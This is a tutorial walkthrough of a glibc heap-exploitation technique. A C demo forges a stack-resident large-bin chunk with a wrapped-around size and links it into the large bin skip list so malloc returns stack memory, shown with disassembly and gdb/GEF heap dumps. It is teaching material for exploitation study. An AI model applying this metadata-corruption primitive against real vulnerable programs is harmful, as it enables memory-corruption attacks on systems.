# Large Bin Skip List

So this time around, we will again be trying to allocate a chunk off of the stack. However, we will be doing so via leveraging the large bin's skip list.

Here is the code:

```
#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x080
#define CHUNK_SIZE1 0x440
#define CHUNK_SIZE2 0x450

void main() {
    long *chunk0,
            *chunk1;

    long stack_array[20];

    // So this time around, again we will be trying to get malloc to allocate a stack ptr.
    // This time, we will be leveraging the large bin skiplist.
    // However, we will be doing things a little differently this time.
    // Similar to the previous instances, we will be making a fake chunk
    // Except this time, we will set the size to 0xfffffffffffffff0
    // This would cause the address of the next chunk to wrap around, and legit be the 0x10 bytes before our fake chunk header
    // This would make it extremely convenient, to pass the sizeof(fake_chunk) == prev_size(next_chunk_after_fake_chunk)

    // Allocate, and free two chunks
    // Insert them into the unsorted bin
    // Allocate chunks in between, to prevent consolidation
    chunk0 = malloc(CHUNK_SIZE1);
    malloc(CHUNK_SIZE0);
    chunk1 = malloc(CHUNK_SIZE2);
    malloc(CHUNK_SIZE0);

    free(chunk0);
    free(chunk1);

    // Malloc a chunk, larger than any other unsorted bin chunks
    // Move the two chunks over to the large bin
    // Since they are different sizes, they will both end up in the skip list
    malloc(CHUNK_SIZE2+0x10);

    // Now to create our fake chunk
    // First we will start off with the fake chunk's size, and prev_size
    // The size will be 0xfffffffffffffff0 (prev_inuse set)
    // And prev_size will be 0x00
    stack_array[10] = 0x0000000000000000; // Fake chunk prev_size
    stack_array[11] = 0xfffffffffffffff1; // and chunk size

    // Now for the chunk header after our fake chunk
    // Since the size of the chunk is 0xfffffffffffffff0
    // And this is a 64 bit architecture, it will legit
    // Wrap around, and be the previous 0x10 bytes
    // The prev_size we will set to `0xfffffffffffffff0`
    // And the size we willset to `0x40` (I don't know if the chunk size matters here)
    stack_array[8] = 0xfffffffffffffff0; // Next chunk after fake chunk prev_size
    stack_array[9] = 0x0000000000000041; // and chunk size

    // So, we have made our fake large bin chunk,
    // Time to link it into the large bin
    // Both the doubly linked list, and the skip list
    // However, there is one thing to take note of

    // The skiplist iteration will iterate, from the smallest chunk to the largest
    // This way, it should find "the best fit"
    // As long as none of the chunks prior to it in the skip list are large enough
    // for the allocation, it will guarantee our fake largebin chunk gets allocated

    // So let's go and link our fake chunk into the large bin, and skip list

    // Starting with our fake chunk

    stack_array[12] = ((long)chunk0 - 0x10); // Set our fake chunk's fwd
    stack_array[13] = ((long)chunk1 - 0x10); // Set our fake chunk's bk

    stack_array[14] = ((long)chunk0 - 0x10); // Set our fwd_nextsize
    stack_array[15] = ((long)chunk1 - 0x10); // Set our bk_nextsize

    // Now we will insert our fake chunk, in between the two large bin chunks
    // For both the doubly linked list, and skip liist

    chunk0[1] = (long)(&stack_array[10]); // bk
    chunk0[3] = (long)(&stack_array[10]); // bk_nextsize
    chunk1[0] = (long)(&stack_array[10]); // fwd
    chunk1[2] = (long)(&stack_array[10]); // fwd_nextsize

    // Now, all that is left to do, is call malloc with a size that will get us our fake chunk

    malloc(CHUNK_SIZE2);

    // One thing to note here. While this will give us a fake stack chunk, we have the remainder to deal with
    // When a large bin chunk that is being allocated that is sufficiently larger than the allocation size
    // It will split the chunk into two, and the leftover potion will be the remainder
    // The remainder will be inserted into the unsorted bin

    // Due to the huge size of the remainder here, it will cause problems and fail checks if malloc
    // looks at it for allocation of the new unsorted bin chunk, so we have to be careful about how we call malloc after this.
    // Also, this exact method may not be possible in future libc versions, as what checks are done changes.
}
```

## Walkthrough

Similar to a lot of the other walkthroughs, we will be making a fake chunk, and leveraging a particular functionality of the glibc heap to allocate it. One thing that has been annoying to do, for a lot of the main_arena bins, is the check `size(fake_chunk) == prev_size(next_chunk_after_our_fake_chunk)`. This would cause us to not only have to make a fake chunk, but another fake chunk header after our first fake chunk. How we do things here, makes that a bit easier.

This is a 64 bit system. So, if we add two numbers together, wich their result leads to a value that needs more than `64` bits to store, it will in many situations just keep the lower `64` bits. We will use this to our advantage.

In a `64` bit system, if you add `0xfffffffffffffff0` to a memory address, the sum will basically be the `0x10` minus the memory address. Let's say the address is `0x00007ffffffde000`. This is because `0x00007ffffffde000 + 0xfffffffffffffff0 = 0x100007ffffffddff0` and `hex(0x100007ffffffddff0 & 0xffffffffffffffff) = 0x7ffffffddff0`, and `0x00007ffffffde000 - 0x10 = 0x7ffffffddff0`.

As such, if we make the size of our fake chunk to be `0xfffffffffffffff0`, then the chunk header of the next chunk should legit be the previous `0x10` bytes before our fake chunk header. This will make it way more convenient to pass those checks.

As for linking it into the large bin, since we are specifically using the skip list here, we will need to link it both into the doubly linked main arena list, and the skiplist (total of `4` ptrs for the fake chunk, and `2` for each chunk we link it against).

Now for linking it against the skip list. Having a size of `0xfffffffffffffff0` will be extremely beneficial. Since the size values are unsigned, we're basically guaranteed that our chunk will be the largest. As such, as long as the previous chunks in the skip list won't meet the required size, it will choose our chunk.

Doing it this way will also yield one problem. When a large bin chunk is allocated that is larger than the requested size, the remainder will get carved out into a new chunk, and inserted into the unsorted bin. That will certainly happen here. That unsorted bin chunk, if malloc tries to look at it for future allocations, will not pass certain checks, and cause the program to crash. In addition to that, as what checks malloc does changes, this whole thing might not even be possible in future glibc versions.

With that being said, let's see this in action:

```
$   gdb ./skiplist
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.00ms using Python engine 3.10
Reading symbols from ./skiplist...
(No debugging symbols found in ./skiplist)
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000001189 <+0>: endbr64
   0x000000000000118d <+4>: push   rbp
   0x000000000000118e <+5>: mov rbp,rsp
   0x0000000000001191 <+8>: sub rsp,0xc0
   0x0000000000001198 <+15>:    mov rax,QWORD PTR fs:0x28
   0x00000000000011a1 <+24>:    mov QWORD PTR [rbp-0x8],rax
   0x00000000000011a5 <+28>:    xor eax,eax
   0x00000000000011a7 <+30>:    mov edi,0x440
   0x00000000000011ac <+35>:    call   0x1090 <malloc@plt>
   0x00000000000011b1 <+40>:    mov QWORD PTR [rbp-0xc0],rax
   0x00000000000011b8 <+47>:    mov edi,0x80
   0x00000000000011bd <+52>:    call   0x1090 <malloc@plt>
   0x00000000000011c2 <+57>:    mov edi,0x450
   0x00000000000011c7 <+62>:    call   0x1090 <malloc@plt>
   0x00000000000011cc <+67>:    mov QWORD PTR [rbp-0xb8],rax
   0x00000000000011d3 <+74>:    mov edi,0x80
   0x00000000000011d8 <+79>:    call   0x1090 <malloc@plt>
   0x00000000000011dd <+84>:    mov rax,QWORD PTR [rbp-0xc0]
   0x00000000000011e4 <+91>:    mov rdi,rax
   0x00000000000011e7 <+94>:    call   0x1070 <free@plt>
   0x00000000000011ec <+99>:    mov rax,QWORD PTR [rbp-0xb8]
   0x00000000000011f3 <+106>:   mov rdi,rax
   0x00000000000011f6 <+109>:   call   0x1070 <free@plt>
   0x00000000000011fb <+114>:   mov edi,0x460
   0x0000000000001200 <+119>:   call   0x1090 <malloc@plt>
   0x0000000000001205 <+124>:   mov QWORD PTR [rbp-0x60],0x0
   0x000000000000120d <+132>:   mov QWORD PTR [rbp-0x58],0xfffffffffffffff1
   0x0000000000001215 <+140>:   mov QWORD PTR [rbp-0x70],0xfffffffffffffff0
   0x000000000000121d <+148>:   mov QWORD PTR [rbp-0x68],0x41
   0x0000000000001225 <+156>:   mov rax,QWORD PTR [rbp-0xc0]
   0x000000000000122c <+163>:   sub rax,0x10
   0x0000000000001230 <+167>:   mov QWORD PTR [rbp-0x50],rax
   0x0000000000001234 <+171>:   mov rax,QWORD PTR [rbp-0xb8]
   0x000000000000123b <+178>:   sub rax,0x10
   0x000000000000123f <+182>:   mov QWORD PTR [rbp-0x48],rax
   0x0000000000001243 <+186>:   mov rax,QWORD PTR [rbp-0xc0]
   0x000000000000124a <+193>:   sub rax,0x10
   0x000000000000124e <+197>:   mov QWORD PTR [rbp-0x40],rax
   0x0000000000001252 <+201>:   mov rax,QWORD PTR [rbp-0xb8]
   0x0000000000001259 <+208>:   sub rax,0x10
   0x000000000000125d <+212>:   mov QWORD PTR [rbp-0x38],rax
   0x0000000000001261 <+216>:   mov rax,QWORD PTR [rbp-0xc0]
   0x0000000000001268 <+223>:   add rax,0x8
   0x000000000000126c <+227>:   lea rdx,[rbp-0xb0]
   0x0000000000001273 <+234>:   add rdx,0x50
   0x0000000000001277 <+238>:   mov QWORD PTR [rax],rdx
   0x000000000000127a <+241>:   mov rax,QWORD PTR [rbp-0xc0]
   0x0000000000001281 <+248>:   add rax,0x18
   0x0000000000001285 <+252>:   lea rdx,[rbp-0xb0]
   0x000000000000128c <+259>:   add rdx,0x50
   0x0000000000001290 <+263>:   mov QWORD PTR [rax],rdx
   0x0000000000001293 <+266>:   lea rax,[rbp-0xb0]
   0x000000000000129a <+273>:   lea rdx,[rax+0x50]
   0x000000000000129e <+277>:   mov rax,QWORD PTR [rbp-0xb8]
   0x00000000000012a5 <+284>:   mov QWORD PTR [rax],rdx
   0x00000000000012a8 <+287>:   mov rax,QWORD PTR [rbp-0xb8]
   0x00000000000012af <+294>:   add rax,0x10
   0x00000000000012b3 <+298>:   lea rdx,[rbp-0xb0]
   0x00000000000012ba <+305>:   add rdx,0x50
   0x00000000000012be <+309>:   mov QWORD PTR [rax],rdx
   0x00000000000012c1 <+312>:   mov edi,0x450
   0x00000000000012c6 <+317>:   call   0x1090 <malloc@plt>
   0x00000000000012cb <+322>:   nop
   0x00000000000012cc <+323>:   mov rax,QWORD PTR [rbp-0x8]
   0x00000000000012d0 <+327>:   sub rax,QWORD PTR fs:0x28
   0x00000000000012d9 <+336>:   je  0x12e0 <main+343>
   0x00000000000012db <+338>:   call   0x1080 <__stack_chk_fail@plt>
   0x00000000000012e0 <+343>:   leave  
   0x00000000000012e1 <+344>:   ret    
End of assembler dump.
gef➤  b *main+124
Breakpoint 1 at 0x1205
gef➤  b *main+317
Breakpoint 2 at 0x12c6
gef➤  b *main+322
Breakpoint 3 at 0x12cb
gef➤  r
Starting program: /Hackery/shogun/pwn_demos/large_bin/skiplist/skiplist
warning: File "/home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
To enable execution of this file add
    add-auto-load-safe-path /home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1
line to your configuration file "/home/guy/.gdbinit".
To completely disable this security protection add
    set auto-load safe-path /
line to your configuration file "/home/guy/.gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
    info "(gdb)Auto-loading safe path"
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Breakpoint 1, 0x0000555555555205 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559c70  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x471           
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf10  →  0x00005555555592a0  →  0x00007ffff7e2d100  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0
$rbp   : 0x00007fffffffdfd0  →  0x0000000000000001
$rsi   : 0x460           
$rdi   : 0x0000555555559c70  →  0x0000000000000000
$rip   : 0x0000555555555205  →  <main+124> mov QWORD PTR [rbp-0x60], 0x0
$r8 : 0x3            
$r9 : 0x0            
$r10   : 0x2             
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0e8  →  0x00007fffffffe3ed  →  "/Hackery/shogun/pwn_demos/large_bin/skipl[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf10│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2d100  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0    ← $rsp
0x00007fffffffdf18│+0x0008: 0x0000555555559780  →  0x0000555555559290  →  0x0000000000000000
0x00007fffffffdf20│+0x0010: 0x0000000000000000
0x00007fffffffdf28│+0x0018: 0x0000000000000000
0x00007fffffffdf30│+0x0020: 0x0000000000000000
0x00007fffffffdf38│+0x0028: 0x0000000000000000
0x00007fffffffdf40│+0x0030: 0x0000000000000040 ("@"?)
0x00007fffffffdf48│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551f6 <main+109>    call   0x555555555070 <free@plt>
   0x5555555551fb <main+114>    mov edi, 0x460
   0x555555555200 <main+119>    call   0x555555555090 <malloc@plt>
 → 0x555555555205 <main+124>    mov QWORD PTR [rbp-0x60], 0x0
   0x55555555520d <main+132>    mov QWORD PTR [rbp-0x58], 0xfffffffffffffff1
   0x555555555215 <main+140>    mov QWORD PTR [rbp-0x70], 0xfffffffffffffff0
   0x55555555521d <main+148>    mov QWORD PTR [rbp-0x68], 0x41
   0x555555555225 <main+156>    mov rax, QWORD PTR [rbp-0xc0]
   0x55555555522c <main+163>    sub rax, 0x10
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "skiplist", stopped 0x555555555205 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555205 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] large_bins[64]: fw=0x555555559770, bk=0x555555559290
 →   Chunk(addr=0x555555559780, size=0x460, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x5555555592a0, size=0x450, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in 1 large non-empty bins.
gef➤  x/20g 0x555555559770
0x555555559770: 0x0 0x461
0x555555559780: 0x555555559290  0x7ffff7e2d100
0x555555559790: 0x555555559290  0x555555559290
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
0x5555555597f0: 0x0 0x0
0x555555559800: 0x0 0x0
gef➤  x/20g 0x555555559290
0x555555559290: 0x0 0x451
0x5555555592a0: 0x7ffff7e2d100  0x555555559770
0x5555555592b0: 0x555555559770  0x555555559770
0x5555555592c0: 0x0 0x0
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
```

So we start off, with seeing our `0x555555559770/0x555555559290` chunks in the large bin, and the skiplist as well.

Let's see what it looks like after we have made our fake chunk, and linked it into the large bin skip list:

```
gef➤  c
Continuing.

Breakpoint 2, 0x00005555555552c6 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559790  →  0x00007fffffffdf70  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x471           
$rdx   : 0x00007fffffffdf70  →  0x0000000000000000
$rsp   : 0x00007fffffffdf10  →  0x00005555555592a0  →  0x00007ffff7e2d100  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0
$rbp   : 0x00007fffffffdfd0  →  0x0000000000000001
$rsi   : 0x460           
$rdi   : 0x450           
$rip   : 0x00005555555552c6  →  <main+317> call 0x555555555090 <malloc@plt>
$r8 : 0x3            
$r9 : 0x0            
$r10   : 0x2             
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0e8  →  0x00007fffffffe3ed  →  "/Hackery/shogun/pwn_demos/large_bin/skipl[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf10│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2d100  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0    ← $rsp
0x00007fffffffdf18│+0x0008: 0x0000555555559780  →  0x00007fffffffdf70  →  0x0000000000000000
0x00007fffffffdf20│+0x0010: 0x0000000000000000
0x00007fffffffdf28│+0x0018: 0x0000000000000000
0x00007fffffffdf30│+0x0020: 0x0000000000000000
0x00007fffffffdf38│+0x0028: 0x0000000000000000
0x00007fffffffdf40│+0x0030: 0x0000000000000040 ("@"?)
0x00007fffffffdf48│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552ba <main+305>    add rdx, 0x50
   0x5555555552be <main+309>    mov QWORD PTR [rax], rdx
   0x5555555552c1 <main+312>    mov edi, 0x450
 → 0x5555555552c6 <main+317>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000450,
   $rsi = 0x0000000000000460,
   $rdx = 0x00007fffffffdf70 → 0x0000000000000000
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "skiplist", stopped 0x5555555552c6 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552c6 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] large_bins[64]: fw=0x555555559770, bk=0x555555559290
 →   Chunk(addr=0x555555559780, size=0x460, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x7fffffffdf80, size=0xfffffffffffffff0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x5555555592a0, size=0x450, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 3 chunks in 1 large non-empty bins.
gef➤  x/20g 0x555555559770
0x555555559770: 0x0 0x461
0x555555559780: 0x7fffffffdf70  0x7ffff7e2d100
0x555555559790: 0x7fffffffdf70  0x555555559290
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
0x5555555597f0: 0x0 0x0
0x555555559800: 0x0 0x0
gef➤  x/20g 0x7fffffffdf60
0x7fffffffdf60: 0xfffffffffffffff0  0x41
0x7fffffffdf70: 0x0 0xfffffffffffffff1
0x7fffffffdf80: 0x555555559290  0x555555559770
0x7fffffffdf90: 0x555555559290  0x555555559770
0x7fffffffdfa0: 0x0 0x0
0x7fffffffdfb0: 0x0 0x0
0x7fffffffdfc0: 0x0 0x26543a3a39931e00
0x7fffffffdfd0: 0x1 0x7ffff7c23fbd
0x7fffffffdfe0: 0x7ffff7fc9000  0x555555555189
0x7fffffffdff0: 0x1ffffe0d0 0x7fffffffe0e8
gef➤  x/20g 0x555555559290
0x555555559290: 0x0 0x451
0x5555555592a0: 0x7ffff7e2d100  0x7fffffffdf70
0x5555555592b0: 0x555555559770  0x7fffffffdf70
0x5555555592c0: 0x0 0x0
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
```

So here, we see that our fake chunk at `0x7fffffffdf70` has been linked in. We also see the chunk header after our fake chunk at `0x7fffffffdf60`. Now with a malloc request size of `0x450` we should get our stack chunk:

```
gef➤  c
Continuing.

Breakpoint 3, 0x00005555555552cb in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdf80  →  0x0000555555559290  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x0000555555559770  →  0x0000000000000000
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf10  →  0x00005555555592a0  →  0x00007ffff7e2d100  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0
$rbp   : 0x00007fffffffdfd0  →  0x0000000000000001
$rsi   : 0x450           
$rdi   : 0x00007fffffffdf80  →  0x0000555555559290  →  0x0000000000000000
$rip   : 0x00005555555552cb  →  <main+322> nop
$r8 : 0x3            
$r9 : 0x77           
$r10   : 0x5d            
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0e8  →  0x00007fffffffe3ed  →  0x000000000000007f
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf10│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2d100  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0    ← $rsp
0x00007fffffffdf18│+0x0008: 0x0000555555559780  →  0x0000555555559290  →  0x0000000000000000
0x00007fffffffdf20│+0x0010: 0x0000000000000000
0x00007fffffffdf28│+0x0018: 0x0000000000000000
0x00007fffffffdf30│+0x0020: 0x0000000000000000
0x00007fffffffdf38│+0x0028: 0x0000000000000000
0x00007fffffffdf40│+0x0030: 0x0000000000000040 ("@"?)
0x00007fffffffdf48│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552be <main+309>    mov QWORD PTR [rax], rdx
   0x5555555552c1 <main+312>    mov edi, 0x450
   0x5555555552c6 <main+317>    call   0x555555555090 <malloc@plt>
 → 0x5555555552cb <main+322>    nop    
   0x5555555552cc <main+323>    mov rax, QWORD PTR [rbp-0x8]
   0x5555555552d0 <main+327>    sub rax, QWORD PTR fs:0x28
   0x5555555552d9 <main+336>    je  0x5555555552e0 <main+343>
   0x5555555552db <main+338>    call   0x555555555080 <__stack_chk_fail@plt>
   0x5555555552e0 <main+343>    leave  
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "skiplist", stopped 0x5555555552cb in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552cb → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$1 = 0x7fffffffdf80
gef➤  vmmap 0x7fffffffdf80
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
gef➤  c
Continuing.
[Inferior 1 (process 97907) exited normally]
```

Just like that, we were able to leverage the large bin's skip list to allocate a chunk off of the stack.
